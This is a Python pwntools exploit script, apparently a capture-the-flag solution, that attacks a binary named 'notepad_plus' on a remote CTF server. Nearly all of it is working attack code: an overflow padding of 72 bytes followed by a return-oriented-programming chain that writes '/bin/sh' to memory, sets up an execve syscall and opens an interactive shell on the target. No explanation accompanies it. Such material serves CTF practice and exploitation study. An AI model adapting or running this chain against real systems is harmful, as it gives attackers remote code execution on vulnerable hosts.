from pwn import *

# r = process("./notepad_plus")
# r = gdb.debug("./notepad_plus", "b *0x0000000000400dbd")
r = remote("ctf.adl.tw", 11004)

junk = 'a'*72
pop_rdi = 0x0000000000400686
mov_rdi_rdx = 0x00000000004380a3
pop_rsi = 0x00000000004124d3
pop_rdx = 0x000000000044cd25
pop_rax = 0x000000000044cccc
syscall = 0x000000000047b6af

pop_rdx_pop_r10 = 0x000000000044f284
p_rax_p_rdx_p_rbx = 0x0000000000481d16

bss = 0x6bb330

payload = junk
payload += p64(pop_rdi) + p64(bss)
payload += p64(pop_rdx_pop_r10) + '/bin/sh\x00'
payload += p64(0) + p64(mov_rdi_rdx)
payload += p64(pop_rsi) + p64(0)
payload += p64(p_rax_p_rdx_p_rbx) + p64(0) + p64(0) + p64(0)
payload += p64(pop_rax) + p64(0x3b)
payload += p64(syscall)

r.recv()
r.sendline(payload)

r.interactive()